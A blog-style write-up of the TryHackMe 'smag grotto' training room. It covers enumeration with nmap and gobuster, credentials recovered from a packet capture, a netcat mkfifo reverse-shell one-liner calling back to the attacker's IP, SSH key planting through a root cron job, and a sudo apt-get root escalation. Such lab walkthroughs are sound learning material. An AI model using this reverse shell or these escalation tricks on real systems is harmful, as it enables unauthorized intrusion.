---
title: "TryHackMe - smag grotto writeup"
date: 2022-09-20 09:31:00 +0300
image: /assets/img/Posts/Smag.png
categories: [Tryhackme, Easy]
tags: [cronjobs, sudo, web, gobuster, revshell, ssh-keygen, GTFObins, ssh]
---

| Room       | [smag-grotto](https://tryhackme.com/room/smaggrotto)       |
| ---------- | ---------------------------------------------------------- |
| Author     | [tryhackme](https://tryhackme.com/p/tryhackme)             |
| Difficulty | Easy                                                       |
| description| Follow the yellow brick road

>**smag-grotto** is a tryhackme machine that is testing on enumeration, a little bit of wireshark , cron jobs and a simple privilege escalation technique. Therefore this write up entails my approach to solving the machine.
{: .prompt-tip }

# Let's get started
## Nmap scan
As always, start scanning the ports, services and also the low hanging vulns using the nmap scripts. For this case i scanned for ports and found that the machine had only two ports open, 22 (SSH) and 80 (HTTP)
`sudo nmap -A -sT -sV 10.10.90.94 -oN nmap.txt`

![image](/assets/img/Posts/smag-grotto/nmap.webp)

Visited the website and there was nothing there. I tried to look the source code as i always do but there was nothing still.

![image](/assets/img/Posts/smag-grotto/web.webp)
## Directory bruteforcing
I then went on and scanned for the hidden directories using gobuster, if present. woow!! i found mail
`gobuster dir -e -u http://[targetIP] -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php -t 50 | tee gobustlog`

![image](/assets/img/Posts/smag-grotto/gobuster.webp)

Visiting the `mail` directory, i found email messages and a packet capture file. Also checking on the usernames, i realized that they were using `smag.thm` so i went on and added the domain to my `/etc/hosts` file.

![image](/assets/img/Posts/smag-grotto/hosts.webp)

Then i downloaded the `.pcap` file to my machine and opened it using wireshark.

![image](/assets/img/Posts/smag-grotto/wireshark.webp)

Read the packet by right-clicking and follow the `tcp stream`. And there were login credentials. but for which platform? because i did not find any login directory. Checking on the header, there is login form for the host `development.smag.thm`.

![image](/assets/img/Posts/smag-grotto/creds.webp)
## Initial access
I went back to my hosts file and added the development subdomain, visited the `login.php` entered the credentials. They worked, and now much interesting was directed to a page that was executing system commands, more of a webshell. what now? a reverse shell? probably. i tried the `netcat one-liner` command.
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [yourIP]1234 >/tmp/f`

![image](/assets/img/Posts/smag-grotto/webshell.webp)

and waited for the machine to connect by starting a netcat listener in my terminal `nc -nlvp 1234` and I got the connection under the user `www-data`.

![image](/assets/img/Posts/smag-grotto/revshell.webp)

## Privesc - User
I could not do anything like retrieving the flags under this user, so i thought of downloading `linpeas` from my machine. I started `python3 server` and used wget to download the file in `/tmp`.

![image](/assets/img/Posts/smag-grotto/linpeas.webp)

I made it executable by running `chmod +x linpeas.sh` and ran it `./linpeas.sh`.
cron jobs!!!!..there was an interesting cron job that was being executed as root. It is basically copy the contents of the file to `jakes’s` authorised_keys most probably the public key.

![image](/assets/img/Posts/smag-grotto/cronjobs.webp)

To use that to my benefit, i used `ssh-keygen` to create my own ssh `public key` and copied it to the `/opt/.backups/jake_id_rsa.pub.backup` and then went on to login to the jake’s ssh account using my own private key(id_rsa).

![image](/assets/img/Posts/smag-grotto/sshlogin.webp)

### User flag
cat and submit the user flag.

![image](/assets/img/Posts/smag-grotto/userflag.webp)

## Privesc - Root
Getting to root? of course, i needed to escalate my privileges to root. How? i tried `sudo -l` and that’s all, user `jake` was allowed to run the `apt-get` binary as root.

![image](/assets/img/Posts/smag-grotto/sudo.webp)

So i headed to [GTFOBins](https://gtfobins.github.io/) and searched for the binary. i got a command, executed it and i got the root shell….how 34sy!!!!

### root flag
cat `/root/root.txt`

![image](/assets/img/Posts/smag-grotto/rootflag.webp)

i hoped you enjoyed the write up:)

thank you fam!!!!!!!!!!!!!!!!!!
